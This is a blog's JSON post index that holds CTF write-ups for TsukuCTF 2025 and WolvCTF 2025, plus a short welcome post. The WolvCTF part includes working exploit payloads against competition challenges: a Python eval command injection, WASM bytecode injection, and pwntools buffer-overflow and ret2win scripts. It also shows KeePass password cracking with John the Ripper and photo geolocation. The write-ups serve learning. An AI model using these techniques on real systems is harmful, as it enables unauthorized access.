[
  
  {
    "title": "TsukuCTF 2025 writeups",
    "url": "/posts/tsukuctf_2025_writeup/",
    "categories": "CTF, TsukuCTF 2025",
    "tags": "ctf, tsukuctf, writeups, cybersecurity, osint, pwn, cryptography",
    "date": "2025-05-04 12:00:00 +0530",
    





    
    "snippet": "TsukuCTF 2025About TsukuCTF:TsukuCTF is an annual CTF hosted by TaruTaruThis is a CTF with Japanese OSINT as the main genre. There are a few other genres mixed in as well..  TsukuCTF 2025 will be h...",
    "content": "TsukuCTF 2025About TsukuCTF:TsukuCTF is an annual CTF hosted by TaruTaruThis is a CTF with Japanese OSINT as the main genre. There are a few other genres mixed in as well..  TsukuCTF 2025 will be held online (competition URL: https://tsukuctf.org/ ).  The duration of the event is 24h00m from 12:00(JST) on 05/03/2025 to 11:59(JST) on 05/04/2025.  Genres will include OSINT, Web, Pwn, Crypto, etc.  Maximum number of players per team is 4  The event was conducted online from Sat, 03 May 2025, 08:30 IST — Sun, 04 May 2025, 08:30 IST.This is their CTF webpage - https://tsukuctf.org/This is their CTFtime profile - https://ctftime.org/event/2769/tsukushiWelcomeTranslation:Flags are listed in the “announcements” channel of the official TsukuCTF Discord. Flag Format: TsukuCTF25{}Explanation:As the description said the flag is in the anncouncement channel of the discord server. I head over to the discord server, checked out the announcements. I found the flag in the same message they have announced the CTF has started.I got the flag!Flag: TsukuCTF25{welcome_to_TsukuCTF_2025!}OSINTcurveTranslation:These are some of the famous places in Japan. Can you spot anything unusual about this photo? The flag is the website domain for this place. Example: TsukuCTF25{example.com}Explanation:After downloading, I used google lens on the image. After looking at few images I understood that the image is of an escalator in Landmark Tower (Yokohama), Japan. Searched for it in google, found it’s official websiteI got the flag!Flag: TsukuCTF25{yokohama-landmark.jp}destroyedTranslation:Identify the school in the photo of this Telegram post. The flag format should be the coordinates of the location rounded to the nearest 4 decimal places and written in the format TsukuCTF25{latitude_longitude} to the nearest 3 decimal places. Example: TsukuCTF25{12.345_123.456}Warning: In the process of solving this problem, you may see direct images related to war.23:14 GMT+9 Update: Flag addedExplanation:After visiting the telegram channel, looked over the images, checked the description of the post. Found that it is Stepne Community Gymnasium and from the flag emoji it is in Ukraine. So the war must be between Russia and Ukraine. We can see multiple news pages about the gymnasium when we use google lens on all the provided images.After using google maps and searching over Stepne in Zaporizhzhia Oblast looking for the gymnasium for quite a period of time. Got the coordinated, rounded them.I got the flag!Flag: TsukuCTF25{47.797_35.306}riderTranslation:Footprints that walk far away and disappear into the evening darkness, The glittering streetlights decorate the city at night, A group of motorbikes pass by on the road nearby, Only the sound of the wind remains, In the light and shadow, I suddenly stop and wonder, Where am I now?The flag format is TsukuCTF25{latitude_longitude} of the location where this person is standing. However, the latitude and longitude are rounded down to the fifth decimal place._View Hint: This poem has no meaning.__Explanation:After looking at the image and using google lens, found some restaurant named “OTI fried chicken “ which is a restaurant chain in Indonesia.Using google maps and the restaurant’s official webpage, I looked over its branches. After looking at some of the branches came across a branch which has a panda logo on the side of it and the same street light from that in the image. Got the coordinated, rounded them.I got the flag!Flag: TsukuCTF25{-7.3189_110.4970}buildingsTranslation:Once that building is built, the sky will probably get narrower again.The flag format is TsukuCTF25{latitude_longitude} of the location where this person is standing. Note that the latitude and longitude are rounded down to five decimal places.Explanation:Used Google lens on the image. It provided me with two bulding names - Global Front tower and ロイヤルパークス品川 (Royal Parks Shinagawa). They are both from same place that is - Minato City, Tokyo, Japan.Using Google Maps searched for the places. Found the buildings that resembles those in the image. As the photo is taken on a road, I followed the road and observed the buildings to position them just like how the image looks. I got to the position where the photo was taken as everything matches perfectly. Got the coordinated, rounded them.I got the flag!Flag: TsukuCTF25{35.6318_139.7431}powerTranslation:I’ve felt the power.The flag format is TsukuCTF25{latitude_longitude} of the location where this person is standing. Note that the latitude and longitude are rounded down to five decimal places.Explanation:Looking at the image, it is tactile map of someplace in Japan( as the image contains a japanese character). It contains a braille etched metal plate.Used Google lens on the image, I searched the image by cropping it various ways after I cropped it full and added “Japan” to the search, looking over the results, I found the image which resembles the photo. The image is from a stockphoto website. After reading the description, it seems that the image is of “Taira no Masakado’s Grave”Using google maps went over to the location, looked for the maps, found them. Got the coordinated, rounded them.I got the flag!Flag: TsukuCTF25{35.6872_139.7628}Cryptoa8tsukuctfTranslation:I created a suitable KEY and encrypted it, but the tsukuctf part remains the same…Explanation:After checking the encryption python file it seems that this challenge is based on custom autokey Vigenère cipher. Based on the functions and the contents of output.txt, I have written a decrpytion python code:import stringciphertext = \"ayb wpg uujmz pwom jaaaaaa aa tsukuctf, hj vynj? mml ogyt re ozbiymvrosf bfq nvjwsum mbmm ef ntq gudwy fxdzyqyc, yeh sfypf usyv nl imy kcxbyl ecxvboap, epa 'avb' wxxw unyfnpzklrq.\"def f_inv(c, k):    c = ord(c) - ord('a')    k = ord(k) - ord('a')    p = (c - k + 26) % 26    return chr(ord('a') + p)def decrypt(ciphertext, known_plaintext_segment, segment_position):    idx = 0    plain = []    cipher_without_symbols = []    decrypted_key = []    letters_only = [c for c in ciphertext if c in string.ascii_lowercase]    for i in range(len(known_plaintext_segment)):        c = letters_only[segment_position + i]        p = known_plaintext_segment[i]        k = (ord(c) - ord(p)) % 26        k = chr(ord('a') + k)        decrypted_key.append(k)    idx = 0    key = decrypted_key    for c in ciphertext:        if c in string.ascii_lowercase:            if idx &lt; len(key):                k = key[idx]            else:                k = cipher_without_symbols[idx - len(key)]            p = f_inv(c, k)            cipher_without_symbols.append(c)            plain.append(p)            idx += 1        else:            plain.append(c)    return ''.join(plain), ''.join(decrypted_key)lower_only = [c for c in ciphertext if c in string.ascii_lowercase]segment = \"tsukuctf\"segment_position = 30  # Based on the assertplaintext, key = decrypt(ciphertext, segment, segment_position)print(\"Recovered key:\", key)print(\"\\nDecrypted plaintext:\\n\", plaintext)The above code when ran, returns the output:Recovered key: annzbwueDecrypted plaintext: alo xok aqjoy this problem or tsukuctf, or both? the flag is concatenate the seventh word in the first sentence, the third word in the second sentence, and 'fun' with underscores.Based on the decrypted plain text, the flag is seventh-word(firstSentence)_third-word(secondSentence)_fun.I got the flag!Flag: TsukuCTF25{tsukuctf_is_fun}PQC0Translation:I tried using PQC (Post-Quantum Cryptography)!Explanation:Looking at the given encryption source code and output.txt. The code uses ML-KEM-768 (Kyber768) for key encapsulation and AES for encrypting the flag.The provided prob.py script generates an ML-KEM-768 private key: priv-ml-kem-768.pem, derives the corresponding public key: pub-ml-kem-768.pem. Uses the public key to encapsulate a shared secret, producing: ciphertext.dat and shared.dat( the derived shared secret ).To decrypt it, we need the shared secret.For that, from the output.txt the created three files:  Private Key: Save the PEM-formatted private key between the —–BEGIN PRIVATE KEY—– and —–END PRIVATE KEY—– lines into a file named priv-ml-kem-768.pem.  Ciphertext: Convert the hex string under ==== ciphertext(hex) ==== into binary and save it as ciphertext.dat.  Encrypted Flag: Convert the hex string under ==== encrypted_flag(hex) ==== into binary and save it as encrypted_flag.bin.Used OpenSSL to decapsulate the shared secret.openssl pkeyutl -decap -inkey priv-ml-kem-768.pem -in ciphertext.dat -secret shared.datUsed this python script to decrypt the flag:from Crypto.Cipher import AESfrom Crypto.Util.Padding import unpadwith open(\"shared.dat\", \"rb\") as f:    shared_secret = f.read()with open(\"encrypted_flag.bin\", \"rb\") as f:    encrypted_flag = f.read()cipher = AES.new(shared_secret, AES.MODE_ECB)decrypted_flag = unpad(cipher.decrypt(encrypted_flag), 16)print(decrypted_flag.decode())I got the flag!Flag: TsukuCTF25{W3lc0me_t0_PQC_w0r1d!!!}"
  },
  
  {
    "title": "WolvCTF 2025 writeups",
    "url": "/posts/wolvctf_writeup/",
    "categories": "CTF, WolvCTF 2025",
    "tags": "ctf, wolvctf, writeups, cybersecurity, forensics, reverse-engineering, pwn, cryptography",
    "date": "2025-03-27 21:45:00 +0530",
    





    
    "snippet": "WolvCTF 2025About WolvCTF:WolvCTF is an annual CTF hosted by WolvSec.WolvSec is a cybersecurity/hacking club at the University of Michigan. The club is composed of undergrads, graduate students, al...",
    "content": "WolvCTF 2025About WolvCTF:WolvCTF is an annual CTF hosted by WolvSec.WolvSec is a cybersecurity/hacking club at the University of Michigan. The club is composed of undergrads, graduate students, alumni, university staff, and local industry professionals who are all focused on creating a fun, friendly, collaborative learning environment for cybersecurity.WolvCTF 2025 is consists of challenges ranging from beginner to hard in difficulty and topics like RevEng, Forensics, OSINT, Web Exploit, Cryptography, Binary Exploit and Misc. The event was conducted online from Sat, 22 March 2025, 04:30 IST — Mon, 24 March 2025, 04:30 IST.This is their CTF webpage - https://wolvctf.io/This is their CTFtime profile - https://ctftime.org/event/2579MiscSanity CheckExplanation:They told us to check out their discord server. So just like many challenges of this type, the flag must be somewhere in the server.While inspecting, the channels in the server we can view the flag stored in the channel topic of “faq” channel.We got the flag!Flag: wctf{m1chigan_NCAA_champi0ns_inc0ming}Eval is EvilExplanation:They have given us a netcat command to connect to a remote server and also a download - dist.tar.gz. As it is gzip compressed and tar compressed, lets decompress it using the below commands:gzip -d dist.tar.gztar -xvf dist.tarelse you can use a one-liner command to completely extract the file contents:tar -xvzf dist.tar.gzNow after extracting the compressed folder you will get this - challenge/chall.py. So what we are given is a python file. Let’s inspect the source code.import randomdef main():        print(\"Let's play a game, I am thinking of a number between 0 and\", 2 ** 64, \"\\n\")    try:        guess = eval(input(\"What is the number?: \"))    except:        guess = 0    correct = random.randint(0, 2**64)        if (guess == correct):        print(\"\\nCorrect! You won the flag!\")        flag = open(\"flag.txt\", \"r\").readline()        print(flag)    else:        print(\"\\nYou lost lol\")main()After inspecting the source code you can understand that the program asks the user enter a number between 0 and 2**64 which is 18,446,744,073,709,551,616 😮. Then evaluates it, if the user entered a valid input, it stores the value in a variable - guess, and compares it to a random valued variable - correct. If the values match then the program is going to print the content of flag.txt. But who is talented enough to guess what random value is generated by the program, right!We can exploit this program using - arbitary code execution ( The user can enter ANY Python code ). We can input the below line as the input, then we can have the contents of flag.txt.__import('os').system(\"cat flag.txt\")Explanation of above command - As there is a possiblity of arbitary code execution, we are inserting a python code as the input. The code consist of os module in Python provides a way to interact with the operating system. It allows your Python program to perform system-level tasks. Which can also mean we can execute system commands. So we are using - cat to read the contents of flag.txt, this will give us the flag.We got the flag!NOTE: If you didn’t get the flag and it shows the error - “cat: flag.txt: no such file or directory”, its because you are running the code in local which has no flag.txt file, when you run the given netcat command, you will get the flag stored in the flag.txt of the remote server.Flag:  wctf{Why_Gu3ss_Wh3n_Y0u_C4n_CH34T}Wasm 0Explanation:They have given us a netcat command to connect to a remote server and also a download - dist.tar.gz. To get started we have to first extract the contents of the downloaded compressed folder. As the process is similiar in most of the challanges I won’t be mentioning in every challenge, so please refer to the explanation of Eval is Evil challenge writeup for the process to decompress.After decompressing, we will be provided with three files - 0.js, wasm.js and package.json. I have provided the source code of each file below.0.js ——-&gt;const readline = require(\"readline\");const rl = readline.createInterface({    input: process.stdin,    output: process.stdout});let { Builder, parseHex } = require('./wasm.js');function win() {    console.log(\"wctf{redacted-flag}\");}let mod = new Builder();// (type ;0; () -&gt; ())mod.addSection(1, [0x01, 0x60, 0x00, 0x00]);// (func ;0; (import \"i\" \"win\") (type 0))mod.addSection(2, [0x01, 0x01, 0x69, 0x03, 0x77, 0x69, 0x6e, 0x00, 0x00]);// (func ;1; (type 0))...mod.addSection(3, [0x01, 0x00])// (func ;1; (export \"main\") (type 0))mod.addSection(7, [0x01, 0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00, 0x01])rl.question(\"&gt;&gt;&gt; \", (answer) =&gt; {    mod.addSection(10, parseHex(answer));    let wasmMod = new WebAssembly.Module(new Uint8Array(mod.data));    let instance = new WebAssembly.Instance(wasmMod, { 'i': { win } });    instance.exports.main();    process.exit(0);});wasm.js ——-&gt;let isEven = require('is-even');function leb128(n) {    let result = [];    do {        result.push((n &amp; 0x7f) | 0x80);        n &gt;&gt;= 7;    } while (n)    result[result.length - 1] &amp;= 0x7f;    return result;}class Builder {    constructor() {        this.data = [0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00];    }    addSection(id, section) {        this.data.push(id);        this.data.push(...leb128(section.length));        this.data.push(...section);    }}// node doesn't support Uint8Array.fromHex :(function parseHex(answer) {    // javascript developers try not to write literally anything    // into a package challenge IMPOSSIBLE    if (!isEven(answer.length)) {        console.log(\"odd\");        process.exit(1);    }    let result = [];    for (let i = 0; i &lt; answer.length; i += 2) {        result.push(parseInt(answer.substring(i, i+2), 16));    }    return result;}module.exports = { Builder, parseHex }package.json ——-&gt;{  \"name\": \"wasmjail\",  \"version\": \"1.0.0\",  \"scripts\": {    \"test\": \"echo \\\"Error: no test specified\\\" &amp;&amp; exit 1\"  },  \"author\": \"\",  \"license\": \"ISC\",  \"description\": \"\",  \"dependencies\": {    \"is-even\": \"^1.0.0\"  }}Explanation of source code:0.js is a NodeJS code designed to create and execute WebAssembly (WASM) module dynamically, but seeing the way it processes the user input, it is vulnerable to WASM-based code injection aka arbitrary WebAssembly bytecode injection.Wasm.js is a NodeJs code provides helper functions for constructing WebAssembly (WASM) binaries dynamically. Since parseHex(answer) directly converts user input into executable WASM bytecode, an attacker can inject malicious WASM instructions, trigger arbitrary WebAssembly functions.So I am going to provide hex input that will be added as section 10 (the code section) of the module. So the hex string payload I will be providing to exploit the vulnerability is:01040010000bWhere,  0x01 for 1 function  0x04 for size (4 bytes)  0x00 for 0 locals  0x10 0x00 to call function index 0 (the imported win function)  0x0b to end the functionWhen we enter the string as input to tne netcat command, we will get the flag.We got the flag!BeginnerREverseHints:  You might want to use a decompiler  https://dogbolt.org/Explanation:They have given us a compressed folder - dist.tar.gz, read the writeup of Eval is Evil to know the decompression process.After decompressing, we will get a ELF 64-bit file - reverse and a text file - out.txt. From the hints we can understand that it is asking us to use a decompiler to analyse the binary. I am using Ghidra for binary analysis (you can use online decompiler - dogbolt as mentioned in the second hint).After analyzing the decompiled code of the binary, I got to know that it is a code to mix the contents of flag.txt, and the out.txt contains the output. So we have to reverse the output to get the input.I have written a python code to reverse the process.def unmix_flag(mixed_flag):    original_flag = ''.join(chr(ord(c) + 3) for c in mixed_flag)        return original_flagmixed_flag = input(\"Enter the mixed flag: \")original_flag = unmix_flag(mixed_flag)print(\"Original flag:\", original_flag)When we the give the contents of out.txt as the input of this pythond code, we will get the flag.(I don’t think this is the process, it must be a bug in the content of out.txt, according to the given binary file, it is also supposed to reverse it after subtracting 3, but when I try it that way I got the reverse flag. So I eliminated the revering process and only subtracted 3 in the python code.)We got the flag!Flag:  wctf{r3v3r51ng_1n_r3v3r53}REdata - RevHints:  did you know that there is information other than code in a binary?  Are there any utilities that let you find strings in files?Explanation:They have given us a compressed folder - dist.tar.gz, read the writeup of Eval is Evil to know the decompression process.After decompressing, we will get an ELF 64-bit file - redata. As the hint mentioned something about strings I used strings and grep command to get the flag.strings redata | grep \"wctf\"We got the flag!Flag: wctf{n0_w4y_y0u_f0unD_1t!}OverAndOver - CryptoHints:  Perhaps decoding once isnt enough?Explanation:After downloading and viewing the contents of the text file - encoded.txt, it looked like it was encrypted. So I tried base64 decoding.base64 -d encoded.txtIt somehow didn’t work YET!, as it is not geneating any invalid characters while decoding, it must be base64 encoded and from the challenge name and the hint, we can understand that it is being encoded multiple times.So as I didn’t know how many times I keep on running the below command to get the flagecho \"Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1IySkVUbGhoTVhCUVZteFZlRll5VGtsalJtaG9UVmhDVVZacVFtRlRNazE1VTJ0V1ZXSkhhRzlVVjNOM1pVWmFkR05GZEZSTlZXdzFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1UyMTRVMkpIZHpGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm0weGIxSkdXbGRYYlVaclVqRmFTRll5TVRSVk1rcElaSHBHVjJFeVVYZFpla3BIWXpGT2RWVnRhRk5sYlhoWFZtMHdlR0l4U2tkWGJHUllZbGhTV0ZSV2FFTlNiRnBZWlVoa1YwMUVSa1pWYkZKRFZqSkdjbUV6YUZaaGExcG9WakJhVDJOdFJrZFhiV2hzWWxob2IxWnRNWGRVTVZWNVVtdGtWMWRIYUZsWmJHaFRWMFpTVjFwRVFrOWlSM2hYVmpKNFQxWlhTa2RqUm14aFUwaENSRlpxUVhoa1ZsWjFWMnhrYUdFelFrbFdWM0JIVkRKU1YxVnVVbXBTYXpWWVZXcE9iMkl4V1hoYVJGSnBUVlpXTkZaWGRHdFhSMHB5VGxac1dtSkdXbWhaTW5oWFl6RldjbHBHYUdsU00xRjZWakowVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5UUmxweFUydGFiRlpzV2xwWGExcDNZa2RGZWxGcmJGZGlXRUpJVmtSS1UxWXhXblZVYkdocFZqSm9lbGRYZUc5aU1rbDRWMjVTVGxkSFVsWlVWbHBYVGxaV2RHUkhkRmROVjFKSldWVmFjMWR0U2tkWGJXaGFUVlp3VkZacVJtdGtSa3AwWlVaa2FWSnNhM2hXYTFwaFZURlZlRmR1U2s1WFJYQnhWVzB4YjFZeFVsaE9WazVzWWtad2VGVXlkREJXTVZweVYyeHdXbFpXY0doWmEyUkdaVWRPU1dKR1pGZFNWWEJ2Vm10U1MxUXlVa2RUYmtwaFVtMW9jRlpxVG05V1ZtUlhWV3M1VWsxWFVraFdNalZUVkd4YVJsTnNhRlZXTTJoSVZHeGFZVmRGTlZaUFZtaFRUVWhDU2xac1pEUmpNV1IwVTJ0a1dHSlhhR0ZVVmxwM1lVWndSbHBHVGxSU2EzQjVWR3hhVDJGV1NuUlBWRTVYVFc1b1dGZFdXbEpsVmtweVdrWm9hV0Y2Vm5oV1ZFSnJUa1prUjFWc1pGaGhNMUpWVlcxNGQyVkdWblJOVldSV1RXdHdWMWxyVW1GWFIwVjRZMGhLV2xaWFVrZGFWV1JQVTBVNVYyRkhhRTVXYmtKMlZtMTBVMU14VVhsVVdHeFZZVEZ3YUZWcVNtOVdSbEpZVFZjNWJHSkhVbGxhVldNMVlWVXhXRlZ1Y0ZkTlYyaDJWakJrUzFkV1ZuSlBWbHBvWVRGd1NWWkhlR0ZaVm1SR1RsWmFVRll5YUhCVmJHaENaREZhYzFwRVVtcE5WMUl3VlRKMGExZEhTbGhoUjBaVlZteHdNMXBYZUhKbFZURldXa1pPYVZKcmNEWldhMk40WXpGVmVWTnVTbFJpVlZwWVZGYzFiMWRHWkZkWGJFcHNVbTFTZWxsVldsTmhWa3AxVVc1b1YxWXphSEpXVkVaelZqRldjMWRzYUdsV1ZuQjZWMWQwWVdReVZrZFdXR3hyVWtWS1dGUldXbmRsVmxsNVpVaGtXR0pHY0ZoWk1HaExWakpHY2xkcmVGZGhhM0JRVldwR1lXTXlSa2RoUmxKVFZsaENTMVpxUm1GVk1VMTRWbGhvV0ZkSGFHaFZNRnBoVm14c2NsZHJkR3BTYkhCNFZUSXdOV0pIU2toVmJHeGhWbGROTVZsV1ZYaFhSbFp5WVVaa1RtRnNXbFZXYTJRMFV6RktjMXBJVmxSaVJscFlXV3RvUTA1c1draGxSMFphVm0xU1IxUnNXbUZWUmxwMFZXczVWMkZyV2t4Vk1uaHJWakZhZEZKdGNFNVdNVWwzVmxSS01HRXhaRWhUYkdob1VqQmFWbFp0ZUhkTk1XeFdWMjVrVTJKSVFraFdSM2hUVmpKS2NsTnJhRmRTTTJob1ZrUktSMWRHU2xsYVIzQlRWak5vV1ZkWGVHOVJNVTE0Vld4a1lWSldjSE5WYlRGVFYyeGtjbFpVUmxoU2EzQmFWVmMxYjFZeFdYcGhTRXBhWVd0YWVsWnFSbGRqTVdSellVZG9UazFWY0RKV2JHTjRUa2RSZVZaclpGZGliRXBQVm14a1UySXhVbGRXYm1Sc1lrWnNOVnBWWkVkV01rcEhZa1JhV2xaWGFFeFdNbmhoVjBaV2NscEhSbGRXTVVwUlZsZHdSMWxYVFhsU2EyUm9VbXhLVkZac2FFTlRNVnAwVFZSQ1ZrMVZNVFJXVm1oelZsWmtTR0ZIYUZaTlJuQm9WbTE0YzJOc1pISmtSM0JUWWtad05GWlhNVEJOUmxsNFYyNU9hbEpYYUZoV2FrNVRWRVpzVlZGWWFGTldhM0I2VmtkNFlWVXlTa1pYV0hCWFZsWndSMVF4V2tOVmJFSlZUVVF3UFE9PQ==\" | base64 -dI used the above command because I can’t always decode and store it in another file to decode it again and open it everytime to know whether I got the flag, so I use the above command, use the output in the echo to decode it again. After running it multiple times (16 or 32, I don’t remember 😅). We will get the flag.We got the flag!Flag: wctf{bA5E_tWo_p0W_s!X}EtTuCaesar - CryptoHints:  A Caesar salad isn’t complete without a good toss—maybe try unscrambling it from different angles?  What if I put the note in the shape of a square?Explanation:This is the string in the given file - message.txt.tzc3Sq{k!ss!a!__FZ!!_!11}As it mentioned caesar cipher, I tried decoding it and at shift value 3, I got this:wcf3Vt{n!vv!d!__IC!!_!11} Though it looks like a flag, it isn’t from the hints we can know that to get the flag we have to arrange it in square. As the length is 25, let’s try to arrange it in 5x5 square.w c f 3 Vt { n ! vv ! d ! __ I C ! !_ ! 1 1 } After spending some time to find the pattern for the flag, I got the pattern it is1   2   4   7   113   5   8   12  166   9   13  17  1810  14  19  20  2115  22  23  24  25This pattern name is - diagonal filling pattern a.k.a diagonal traversal pattern. Arranging the decoded string in the order will give us the flag.We got the flag!Flag: wctf{v3n!_V!dI_v!C!_!1!1}PicturePerfect - ForensicsHint:  Images have interesting information in their metadata!Explanation:From the hint we can understand that the flag is in the metadata, so I used the exiftool to get the flag.exiftool hi_snowman.jpgWe will get the flag as the value of - Title, in the metadata.We got the flag!Flag: wctf{d0_yOU_w@nt_t0_BUiLd_a_Sn0Wm@n}DigginDir - ForensicsHint:  I wish there was a linux utility that let me search for stuff…Explanation:They have given us a compressed folder - dist.tar.gz, read the writeup of Eval is Evil to know the decompression process.After decompressing, we will get a folder - challenge which consists of 251 folders with each folder containg a text file. I expect that out of all folders one folder’s text file should have the flag. But we can’t keep checking every file manually so I used the below command:grep -r \"wctf\" .This command traverses all the contents and finds the string which contains - wctf, which is a part of the flag.We got the flag!Flag: wctf{0h_WOW_tH@Nk5_yOu_f0U^d_1t_xD}p0wn3d - PwnHint:  What is a buffer overflow? What is acii?Explanation:They have given us a netcat command and a compressed folder - dist.tar.gz, read the writeup of Eval is Evil to know the decompression process.After decompressing, we will get a ELF 64-bit file - chal and a C-programmed file - main.c. After analysing the C-programmed source code I understood that it is vulnerable to buffer overflow, so I created a python script to exploit the remote server, here is the python code:from pwn import *p = remote(\"p0wn3d.kctf-453514-codelab.kctf.cloud\", 1337)payload = b\"A\" * 32  payload += p32(0x42424242)  p.sendlineafter(\"Hello little p0wn3r. Do you have any first words?\", payload)p.interactive()Using this python script will give us the flag.We got the flag!Flag: wctf{pwn_1s_l0v3_pwn_1s_l1f3}p0wn3d_2 - PwnHint:  Stack layout? I wish I had GDB with me…Explanation:They have given us a netcat command and a compressed folder - dist.tar.gz, read the writeup of Eval is Evil to know the decompression process.After decompressing, we will get a ELF 64-bit file - chal and a C-programmed file - main.c. After analysing the C-programmed source code I understood that it is vulnerable to buffer overflow has stack layout issue. So to exploit it, I have written a python script which exploits the buffer overflow vulnerability in the remote server.from pwn import *p = remote(\"p0wn3d2.kctf-453514-codelab.kctf.cloud\", 1337)payload = b\"A\" * 32         payload += p32(0xdeadbeef)  payload += p32(0x0badc0de)  p.sendlineafter(\"I can't believe you just did that. Do you have anything to say for yourself?\", payload)p.interactive()This python source code will give us the flag.We got the flag.Flag: wctf{4ll_y0uR_mEm_4r3_bel0ng_2_Us}p0wn3d_3 - PwnHint:  look up what ret2win isExplanation:They have given us a netcat command and a compressed folder - dist.tar.gz, read the writeup of Eval is Evil to know the decompression process.From the hint, ret2win is a return-oriented attack where the goal is to hijack execution flow and directly call a function (get_flag()). Instead of injecting shellcode, the exploit simply redirects execution to an existing function in the binary. This is possible because the binary already contains a useful function (get_flag()) that prints the flag.After decompressing, we will get a ELF 64-bit file - chal and a C-programmed file - main.c. After analysing the C-programmed source code I understood that it is vulnerable to buffer overflow has no stack canaries, no Address Space Layout Randomization (ASLR) or PIE.To exploit this, I crafted a python code which exploits a buffer overflow vulnerability in the binary chal or the remote server and use the ret2win technique to call the get_flag() functionfrom pwn import *REMOTE = True  BINARY = \"./chal\"elf = ELF(BINARY)context.binary = elfif REMOTE:    p = remote(\"p0wn3d3.kctf-453514-codelab.kctf.cloud\", 1337)else:    p = process(BINARY)get_flag = elf.symbols[\"get_flag\"]log.success(f\"get_flag address: {hex(get_flag)}\")offset = 40  payload = b\"A\" * offset  payload += p64(get_flag)  p.sendlineafter(\"something like this before\\n\", payload)p.interactive()  This python source code will give us the flag.We got the flag.Flag: wctf{gr4dua73d_fr0m_l1ttl3_p0wn3r!}ForensicsPasswordsExplanation:We were given a file - Database.kdbx which is a Keepass password database.(KeePass is a free, open-source password manager that helps you securely store and manage your passwords in an encrypted database. The database file usually has a .kdbx extension and is protected by a master password, key file, or both.)Let’s try to open it using keepassxc.keepassxc Database.kdbxBut it is asking for password, so let’s crack the password using John The Ripper.john --wordlist=/usr/share/wordlists/rockyou.txt hash.txtThis gave us a password - goblue1. Now opening the keepass password database using the password, we can see the interface and on the left, sections like - Windows, Network etc., each section has a entry, by double-clicking on it and using the show icon on the password we can view the password. Now let’s try searching for the flag. We can find the flag in Homebanking.We got the flag!Flag: wctf{1_th0ught_1t_w4s_s3cur3?}BreakoutExplantion:We are given a jpg file - breakout.jpg. So after researching on what breakout it and viewing the image, it turns out Breakout is a game developed by Atari in 1976. So this challenge has something to do with the game.Now I used various tools on the image found nothing helpful, luckily on using steghide f=I found somethingsteghide extract -sf breakout.jpgI was able to extract a file - breakout.ch8 which is embeded into the image using steganography..ch8 is a ROM file for the CHIP-8 virtual machine/interpreter. CHIP-8 is an old programming language used in the 1970s primarily for gaming on microcomputers and is now commonly used in emulation.So I think we should play the game to get the flag, I tried searching for online chip-8 emulators to play the game and found - https://ffhan.github.io/ . The webpage allows us to load the chip-8 file and play the game. So I played the classic game and completed it, this gave me the flag.We got the flag!Flag: WCTF{GAME_OVER_VMASBKLTNUFMGS}So, YEP! These are the challenges I solved in WolvCTF 2025. There were a few other challenges that I got stuck on and couldn’t quite solve, but I came close. My favorite challenge from this CTF was definitel Breakout - it involved exploring an old programming language and revisiting the nostalgic Atari game Breakout!Overall, WolvCTF 2025 was an amazing experience! I learned a lot about forensics and reverse engineering, and I even came to love pwn. While I managed to solve most challenges, I struggled with some OSINT and reverse engineering challenges. I’ll be focusing on improving my skills for the next CTF!Big shoutout to my team, WolvSec, for the teamwork and support! Huge thanks to the organizers of WolvCTF 2025 for putting together such an exciting competition.If you found this writeup helpful or have any thoughts, feel free to reach out—let’s connect! Looking forward to the next CTF! 🚀"
  },
  
  {
    "title": "Welcome to My Blog 👋",
    "url": "/posts/welcome/",
    "categories": "Others",
    "tags": "welcome",
    "date": "2025-03-14 00:00:00 +0530",
    





    
    "snippet": "Hello and welcome to my blog! 🚀I’m passionate about cybersecurity, working on various projects, and participating in Capture The Flag (CTF) competitions. This blog is my space to share:🏆 CTF Writeu...",
    "content": "Hello and welcome to my blog! 🚀I’m passionate about cybersecurity, working on various projects, and participating in Capture The Flag (CTF) competitions. This blog is my space to share:🏆 CTF Writeups – Breaking down challenges, strategies, and solutions.🔐 Cybersecurity Insights – Topics, tools, and techniques that I find useful.🛠️ Projects – Showcasing my work in cybersecurity and related fields.🏅 Achievements – Highlights of my journey in this exciting domainWhy This Blog?The cybersecurity world is vast, and learning never stops. By documenting my experiences, I hope to:✅ Help others understand and solve challenges.✅ Contribute to the cybersecurity community.✅ Track my own progress and growth.Stay tuned for upcoming posts, and feel free to connect or leave feedback! 🔥Cheers,CYB3R-BO1"
  }
  
]

